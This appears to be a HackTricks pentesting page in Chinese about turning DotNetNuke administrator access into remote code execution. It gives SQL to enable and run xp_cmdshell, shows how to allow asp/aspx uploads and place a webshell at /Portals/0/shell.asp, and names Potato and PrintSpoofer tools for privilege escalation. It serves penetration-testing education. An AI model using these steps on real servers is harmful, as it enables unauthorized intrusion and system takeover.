# DotNetNuke (DNN)

{{#include ../../banners/hacktricks-training.md}}

## DotNetNuke (DNN)

如果您以 **administrator** 身份登录 DNN，获取 RCE 非常简单。

## RCE

### 通过 SQL

在 **`Settings`** 页面下可以访问 SQL 控制台，您可以启用 **`xp_cmdshell`** 并 **运行操作系统命令**。

使用以下行来启用 **`xp_cmdshell`**：
```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```
然后，按 **"Run Script"** 运行该 SQL 语句。

接着，使用以下内容运行操作系统命令：
```sql
xp_cmdshell 'whoami'
```
### 通过 ASP webshell

在 `Settings -> Security -> More -> More Security Settings` 中，您可以在 `Allowable File Extensions` 下 **添加新的允许扩展名**，然后点击 `Save` 按钮。

添加 **`asp`** 或 **`aspx`**，然后在 **`/admin/file-management`** 上传一个名为 `shell.asp` 的 **asp webshell**。

然后访问 **`/Portals/0/shell.asp`** 以访问您的 webshell。

### 权限提升

您可以使用 **Potatoes** 或 **PrintSpoofer** 例如 **提升权限**。

{{#include ../../banners/hacktricks-training.md}}
